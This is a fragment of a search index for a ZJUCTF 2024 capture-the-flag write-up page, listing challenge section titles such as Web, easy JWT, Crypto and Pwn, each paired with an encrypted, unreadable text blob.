25gBNvoJf4Fs/OpkrJbXVgP6WmdeezHnsGXZjs+7Bq2ep//zktK/pcOsVc6zbXG92QiRw8C4nNUAGtRVynCzuNMmH+FmnTKld2xVrLtzPkz/+dUdvJWO2pXVnGqBncNwM8cAAhydOeD4v2truj85CvS2QNLjQFjkAxZ41gtZBLR5lgV24AryzVFoNo8S4MOgGmOHa8u7kHe/YkItRT1g6AYm0bGm7L1tL3P7NOoIlrwLWgy1Af6S8Y0UIk4zNQwgcI6k/x5A4LIQroynRFZKr4AngdN7jbmIEChIqv2yZn6op6JFhQpFRtXi30KXNE871O9A8WeB+ymAz3XACqxtvJhgi0FsWVGmex5Xgpln4xEgq4s8=;^","title":"Minec(re)tf"},{"location":"writeups/zjuctf2024/#reverse","text":"eamc3+3xMTNuxjbzd0gDzw==;o3WL9GnFkUjJSq0NRU2t1+watnmUHpon22R/yhnxfKc=;^","title":"Reverse"},{"location":"writeups/zjuctf2024/#rev-beginner-1-2-3","text":"58jrL8Sp6+DNdqAisBqx/Q==;idKXrLINjlOwrcORRJsVyi0Sjx5gSLuUUk8VrVO1iY4kRzGTauC/M50f7suwn5d3FRrK9Q1nMk93bOHYEdvv0BgFAma9dARZH2mxw8MtXfTP7f56M9Fbxr9nCOuiLl0S;^","title":"rev beginner 1 2 3"},{"location":"writeups/zjuctf2024/#minecretf-unity-edition","text":"2sqzolaWRFuzEyakn82bDA==;npSGV6ETBXrATAIpm8ZiRudLNaK7c5q5GxgezQdllBaLWH8RL+/jlc3R9MQywVtGkV4+L8LusBqSnhhmHIov7Z69eCHjQZUOfNrTlcqZt1ISLABQ9r55Pazmo+Xbprn5LFaD0t8Ha/QfJwz/Os2+b1Dkeu1TSC4mmo6fdYXZp6U=;^","title":"Minec(re)tf Unity Edition"},{"location":"writeups/zjuctf2024/#rukma","text":"cb6DPtaveR4NBgS+T2eOsQ==;0YNBjODYXmJxLt15Mnmx8lzIdyH8+B7I5vsJaGYWOlH64KIGgDavz1mkdcqj3oVZhxCwetCge1FMW9WScpJSajs7aFEgMa4VDg1RWwMmLmmjVy891gmF0BdDBahrpLHzePnP0pCvGZrEHPn9+hRU3iP+kuZZNAiltSN0+emSYAo=;^","title":"Rukma"},{"location":"writeups/zjuctf2024/#easyhap","text":"6sJfzbQxJDpEOHEi5tEKHA==;3+2IvV1BMVolwbAZoRheQeYAfiV0i1jFFZ6siTZrkCyVvypO7pjjb4Sy1Ceh/O7FbXtxkkJTI211m941fDzsDc0ntJRRjIQHMPJK1/jv9KEv71v+4lDXJp/3Dt7zlZ1mzrZQyBWPgnQR3LfD2dVp4oLlGEfeOIpSPvDbULzVXS6r9MIZkz+E64cs2aviEN08Skbgv9WsK9tYW0DS5ejKW9tJQm3jDe05FmbkWH7qX/CIwiBN7mu6URxGUL8c5/3v7ypmMEdJMMBSgdH+cnCBvMcvkxCLIIY1+KmnjcS/9MhSfV/gUGfArVP9fxOgbWtUYa7E8rmO/mgtWb99X5fKqUNYMTgG7S2AdPkppyNU7v2pPihKIAFO+sqacf+WsZoDi9qv1NA4wOw5KC0gB+06GnJnBci1aGk1533G7nWdDkFGtaHssCN+lYINcxBQ8DYLPTAp4phyyf3WCnRJw6oVZ7XPTUZxjyABrW5BHpCeHemKDck+hZX7L/1HK2WfCEwM44BjLtFP5+TfcOudS0aNQv2tA4hL2WDopU/civdpEJbvoIYJ2vJUhDJLh1AdFnrUaJesRCZeynswNv9uzbkeX4bzr7ZvnibjsKAgdEVBE11U4iQLJVzVEHTTIlZWYklVH3pzA3LPATWpdDP87LNjDloAcZSJHphhjYVFBTOzEndsqNhZoFRmcng+f40wDE1y/ccW5EzAaTxekeKm0tM0wzhjlpNSCGkUfXfW2FIizsPwfXZf6at7vJ4BxpicQ//kuTs3rwcbCdACmmNduGGqaNKf4sP3oZ6gwtdAJaok4xFgFyRIDaJ6pVt2gIRfz/U9EnrHO58KpfxCqvCCalhsMVhdKdJ97CHflcJ2YVVHgrj6ue4hBiTcWBomdflBubrzYi+4ZieRT83vX101+HOh0FOWqvlKjPf4KIliy7S3/cxrbq/gzyG82/20k7cFvbGQb6NinHks35c4oJQh+KyQ6Ww+B0oLB9d3g32xhYHRXEfhffgHon8smHo9M946F1QwPr04hlpEUtENVofo5MBFXvDoh87X2hg0Qvudx4Muz7upOza2U9E9EfznI8iBAON28QKqLu8Pl03KGLV5AB/2DokGcxpDDyscQqi5Di4qEwBu04dm13/4qX4s/Ujdvthv;^","title":"easyhap"},{"location":"writeups/zjuctf2024/#web","text":"NEfLeFHUJ2YpDSb0qtqwww==;IzHjD3+bPUduDfliatg+ZR9n1yYkjOHLpfQmowXFhGg=;^","title":"Web"},{"location":"writeups/zjuctf2024/#easy-pentest","text":"wWU35eZSVifqNE2Z8QBMtA==;gAXQONYwcK2JUDLhx2L7WwJvTlKwCTVzFVpYz+PbOiawhacS8OaLhI8HFUgiNYYuo1pn84X40nK1NAgAvPudCmWG9egXG/u4jFT9exMnElm7RyaHZfbmLW9wBBLgh8kE1Fe0MH0BRQXYM3lcThpx3VOtJksYTc4LTlpB56kGDSoMzZlzjvbGiQ1AoY/eluR/rC1jUT1Eb94fJyQxy9GInJEtL3Ozkq/aI2UV/Jd8JjQAuTovLkd3AzVXuVW3CVOurPvscOJJxjBKEbkSwkjvNqOyEu8F7BtxOUwZg7lIsK1Vfr93sIedyDKgwyTLl3DfjDtr/2gT/JyI75NiLoOiXY+i3PZQH8ZDpoMKACTyhBx80vve4M5e+ycLqIWBHNoZCwJJ8/dL6w8cf/hgCgeOCsyiSgyEPRa4dZqI3hP9TRzP6LX69Nkj30VBUG3oghwiYqTnLhYgr0B7uFvKRs5RtQroR9OUlPWDUNTHV0cLPWNnShIrhYHqnjDMAfoeKn5xdK+iT3QoLuVKRwtoDYCAplXyQzkXeneZN0aD682WP+eV3ZRyPuG08tjrU9ddW99wbCd0Zi9Z/1XGMNUK/z8CIlIbaEKXGzRvdxRweEhBYaLGSmE9/NvGdCdN7QVvjp4R7HwgZW/bevJfaHk/Q6/cipd4XcHV3txsBKOeJvsG01C/O3pqHhFg4LxjlKI5C2TXHssXY2fmsZLLZC1G+cQxVawd0s6DIcd2/BVope0981zkXS/XqlHQeFP3COzMcPppkQpQFH3mr3zCko5L0nwEBA70L8O1kZ+Z0kMVlc7Q2DScB1wficwblzodfdj+zY2jJvkxtiIVsIsbMAylLEPlj0ir4h5GSgDz4mksZFg12vYSaJwiXhQRJV0Pvrv8JMm3flgpF+3RN0FdzbT/p1Kyj68XxBM9fjwR/p2gHOJy07A9TEKbP+xI8BaI/yzYSgC+7dt2Ai7snejzrbyA4pZ6mSCJDdLPFkUzNF+8jrZ42TA7G/FJmFKPTbmN4RjD4ESJKKkI+y5ZR/i5bJiKRfnPn50DZ8uKNfDC7rQ6onfPlao=;^","title":"easy Pentest"},{"location":"writeups/zjuctf2024/#easy-jwt","text":"WB5Pr+E9N4u3DGRCw5WsfA==;e7rieEoAF+N1miz0a8eJf9SKaRQx6076cXQcGvqAXRM4frDb950lXQmOP2EtrYsj5N60+1Vdvayz8rjw/TOMVAIcdtWO95cdVaPGVLRjXKfmJ4Vzlz9LYc6IeBp084SjPtwRXws/ScSNanZ0UpUwAMF8hTS0biCRm74YMNB9pIYKx3+MCuww/61toK7QBDtByJBtGMXirRQEAwaeKrcUCD8m4HyFIs0oeLgcGSeX6PvcR/LFgTVrKCTC1X0RH2ExuXNyzj+A9BBxo48LglpHl7DzBWE0nbTCC2idf49Di4MVFrg63fYNFirkdtqSw++aIw14Dgct6pGB5By7iDNrWEl66zUOKVg+n2R5JHuESUUWHBOa/x2Yu93QEb71j7dWH+tk9j+rcyrhBPqJPnOaeYE+uGGeFLccENX2n3EPZpwQGLggRBg++JnZ/NIESshteyQarKiYeuPCPYjqMgq2tPC0EK+GvjBtd49bKfhwJWfL3/qNQ3n04HNuvMldJ02c;^","title":"easy JWT"},{"location":"writeups/zjuctf2024/#_2","text":"BmFWtBsg36xXBS09l4xz+Q==;67MsVk5TbE3IwUGXJMh7/g604TcjQ3hEPfjdO+twsThP1CAxegaNfSXQ8JOGIwWEv4utEWjve+4qd6dy9AkePdcpJZav2sJAi5tv0b9g71Z+eWkcx8R8zt9MPET28kaammYnIRUM7hQ9yJl105+9e9em1hNuu69IZM6eqfyNjk85aDBl9mxrBWN2ET8oE8o2GLI4UiiDD6d/PHfc8tQE5ZJByH3asHu2eJX8VPWI+CEuRDu8bdQI1dTFe30h+EsZ;^","title":"\u5c71\u96c0"},{"location":"writeups/zjuctf2024/#aviator","text":"ilFFBUaMQXLYM0YCCLrsSg==;7WGhoPH2Iv6QDitF7HcFqqjO5JX6wemNDAJ35HwIzhC6v6qTNMpsOoUj1nKsbyZEQ9Cx5zurwexwQ7wk2Bl1Fm7tFeVssN9cv6So9rU8liLDuN82LomoClHn+I4ROtqo2pR6yBjiyLJhlGB2WMtZARmCxTj9oiNlHjAOkUR/i7+06B49QeCccpyValg2JTsdGWQUQUqKIDgkfHGuIe8iIK8zCc9Mu0zHsYQ2s93sx03iWheIKrBd+Ggha5phcRIlBzvwxWKpwSj1J6KTh0r3ueTG5+sbsrwBdLsjWM+HftvxRYliNG5UY3VSFu/bcC1NyF3cgWnxPTjXBq1bPTFrE6v0ql118eg0bFTZmqRQENEkq+VfvfBBOl2SN87BAMf2;^","title":"Aviator"},{"location":"writeups/zjuctf2024/#crypto","text":"qPfSO5VWxnrN9KflhoIk4w==;59r+m161mbayTEHTbl83LXibX1b+ZywII4Orj3LqetU=;^","title":"Crypto"},{"location":"writeups/zjuctf2024/#shad0wtime","text":"LX4EVVAHx4jZ3HnfqNtRJw==;EQ95RLdkpkQP9oXcaGYBiOBep7wlKfdVX5fYKE4eSR0argze7e5mY6/f7KDMPhZw1Xw8ZZDm6W8TdsEvnvVJKy+ieEG+nAewd1CaY6aN6ocmjlLJTJ+VU6wDtYS7T3a94lpnZxl2xSu/jS6CyKiaijswOm/cY9mB51XbUnNjWWxu3Dq9amb4K8dAKoiiUcdbu7Lv3I1+XkTH8mQNappZ0O7mwhtUdeRLwRguB5WCtQ3cEWTwilwSi+fo9AunOGdEY2PSPYfreFOKC0UjIjTZvSyqLLhN+C43OsqXfRGydrFqPrYGl9haiVs13A3xpjLWkMNEHUaQwbTk0IwHFQi9vlH/15Tedf/ULKfPNr3hQhxkGRo4R5//eUxIPep1P7kp7IIcfICbQi1owxEI7cKiX3t2pIUGLEICqVBLjBV+SeuHRKs9bZy5tZdv8MRxEUltkUBSxawhln3srAbW/vptQ0abcz15ai7h0kVSZqSAisJbAZwXGlbk5Ptv5pIi9oCQ0cVP/JML88wN4tIDlQ5bZwDSvzXXRbPUvnwiuUy9lAqdi3Y0L4yYW8lDrQqeYwrjWqAD9S6Xytb9Iwzve6EnbDCVHOBsW8MCWOsKKDDqXL2WSYHJlKdctVOMrBjTB6Gumu7rbVrcfw1nJslJoZyKgEB2c8qdYGOwdz0MW1yJwDZBdsd9YeWJy7tlqXLvErAJE+B0t8O8vqLREvGpLXRsaYcazIb01lofzJcu9TpnvfD9KYsqrfsSVgIJ1kltd6diIxZUxMdp0qlnRzT8VAo1UfeMgfp6RAIstoFMl86Jvwvq2WcIlUKl3WsCaoY48fCCGqogIMEst2AoD8gYoMgMBw==;^","title":"Shad0wTime"},{"location":"writeups/zjuctf2024/#ezxor","text":"S5LegYmp7cS45MmcaXXrlA==;MmCcB1Job/XeH9JTzcfXYSr/+zdM5S51FWjLNxOvFk7XGMfWg6Z7oV2C5yuLwid/NzAtP9xS/v3KQ7RnPOzd3OqvhVl/rdn/BUKsfQfhPYbqip4bW9Rvm6F0Q9IfzH9Gzk5AoujPkFB0tW/PVLY+psCBm0iCqG/b1swmFxgPZQWipNsnzLFA+WIKhSzhHulx/cLI1+b8ENM5zZEoEqAiBAYNtntHfyhbGRyH1J1J6WzCPFn0ntCaB6jd1qzmAhwPspxGYxM2J3Bwkt7RQH5BQPWrqpke+C7RgUn2AefWhthPhfyBGq+rISsvgGs/Uq4dLyyNJGnD5yYFOJXDys4qS/IajFgn1zhwDcTEWkK5SmT5s67n6JWjRaQRQW8XppSL4zrej2Kj6hVblixQV4gm+EhjQ73JXKUTY9jfP6cpHWtcpDsCdqGMVapc/mKNFi5whMnBYy9Ulm95HQJi+7YvCGbuAdq7iL/BB3cbxeA9kgFupZ7e5iWi2jMsZrSbk8U7ytry+q2UecSUpfnCrpHN/moCLbJ/vh7XE34jyUfhv6Q2nAYOAUCnqSFPzV+SODRjg/vCJRM/c4oYjB6tQC9yzBFK0QIP4erexbngSphzxNwWIUnlojTk2KneZCyG4s8vOx0KSyMhzi3lbXhyhyEfzcGqUzwp1GoDczP/Gii8CFilspGZBptQh4GyHlx2QE5RpvjFbs1j+HaYi1wP4WSzjK9pENaD1aqmWh1TkBtdmhYrYmT8aWN30sLBjJlSpgWFilwscenXJvbvpsIhyDQSjoU3wOdEGSRJBVLGwz0huQyvJGn0fB9OVAwA04NQ+j4eoLa8ZZ3AXoXhx9FwnX8OCwkxjxb7FbJ8dzjQec9FnJ7HDKrASX+9+6/RYPmDK60fPE0TE1MwQKB+sFEhpNi0YOkZpeeY9UCLNI0X/HD0nf4+Qx0kl9kl5AUc/iN9c5z6gHUYEPScM88+iVmo+CA6VQ==;^","title":"ezxor"},{"location":"writeups/zjuctf2024/#seed","text":"dypOJGnj25ysQiHrcnN08w==;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;^","title":"Seed?"},{"location":"writeups/zjuctf2024/#pwn","text":"9k37wo5CUukQlk+b5rKLpA==;zkFcIk2xHmoC71+FSgC0hbOL3Z8fieZdw+k2I/2t2pI=;^","title":"Pwn"},{"location":"writeups/zjuctf2024/#simple-echo","text":"BWab5QEkv3fSZZEEvZK3KQ==;1F328DhFnCAHh3pSVu/+7GnMAXzwEaj4RKgB6IfodXad5uYqjQkC/Vd6OdzYCZQxriDCLdJrdy5aF8yADyHulH3YKWSRSVeKIiL54CQg6NfVpR0qKjROl+MxdXQHiqszySWx3DR3TDV96DkNOLn8Ngw/sBjlQEd92sbK/232y3q1y/JLqiDlISZf0bcvhvx6KHbKn7z+xci0mSK3mY+J2mKENMh1ZNOHReRc8tUdjw6kcKNa8ahw4zbuXpVhXUtI7htXyIEEmVEIzYWDv+uOGOnHkOFwPKJHBk6rA1t9rO0snlvwmAt+tfZyJ+Pn3/akYsXlmu5IvnnUj7NQ8Ip4DAeL3B9hG4ABHsnL5+l6+xDxuznPZGYo0Lnk3QnuEcX+p6Zv7C60XSOBjptujD58gyF3ttgY7zZIEka5MuwABfz5EPJMnoZUDquEMzMzFSj8O5LfNRho7G1la5dKg+clLU/Ld9ByUg4x9HylKq9x0XYqB6WxwzcLHXx/ZxWQo1cTn+DLMr+FHHjGaqEVFrf7iC28InZ0ksyqTY5XWk2v9yxg/Wr93y+SHwpVuJez9YSc4navn6k7/tev788sRooGYesMg1SXr4LhgfLQlf0gnUhHXiWSj+d6DTTLIE+PiXMAGs52pD9pwoCJ9LX04g6C+KO0bz6zO6JbbDnZxY8gjCg3hLj9x6P6JtFjg4/+BzRofDu+xyIaWUDYmiZTQeevy9wyWpxulZ4JhGqKIAXV8+cKLnD4l7f1hNrxygrJq/KD7IUrMT0U1AYDTY2Qb4N8hYf7E/GSxaHaN5+tgEV7a7b2QZHMc7gb9Ndt0VzqoRbBF0my/xybZOTmvHjCpFmUaD0030cMb+K1WYE2/2EldLEBDgyBdRdTC1gJzq81vNfdeblKhW6o3+nT42vkNBBm0j1p0vVvCbL6jDXJqwS9StDWL5ReqBIhm6RJWsPT5SPKg3HqyhMNI78wTjRUB6Z2mi1i0UNjcxZp6SRNF5yVP6jRZAEN7KTctFW0EmYrCiKZTQicmrVXGB89T7dMhjIiOWdsZXVMJH2SS2LHa36CcWlomp/bvA3+09FO13d7Npczw+XNkhTUwNe2MeSA2q6AL2hniGNaQUk2z+z17GwiHybeWpAmRzPB7VK2qmZkWq8IWBPz5qrPhbnKU+P3om7iVnCcRDsGIbpq3W3N+r2pZ4dcD2mhwXLKnAr12+imvikDTaiwIenQxXU/1hL3lWLYQRI4rtWfajaCS+PGWNCIFc1X6vA8rj3vRQ/VGIK/hWZEhAdXP8N4iHWqZBvAwsop8D9FLatqrz4IiJ9O4OBTD8tqq/2+a7iUuu3iVjSrn8woUKE5gNQKFISjyvBar5Q3JsnKITtwB+Yv7XT/3PFBVeNfnQIk5EpmQ+zyWGJeOWIZckLAZqJLstfWjvVaPDEdbT+iU1fH7Tg/Vtor4ayG4gUy9lBQpop4NQ7SfFo5bmUgBa3q3VG/0CqRMFWXk1L7kqB5WFvv+PD2/2j7I+AJ7XnsLAKONA2QA0lq/+KubOrxRs9jIvLIGGr15YBbWYcHDzbLRT99/fZyelCj1SJYeJtj6CXBTh5OdlfdXjhxAPOxoJOuvOObfS5h+8sBdyEoxPBtPAGEj0Vk4xRUZLm3/SlLjawWkJRv9DmLP1juC4kVXnq0RXW4Bx+zNLl3OgbGewQox9xyBJHlj4AudFaA4p6xQ1LOiVglrWtkNQE+D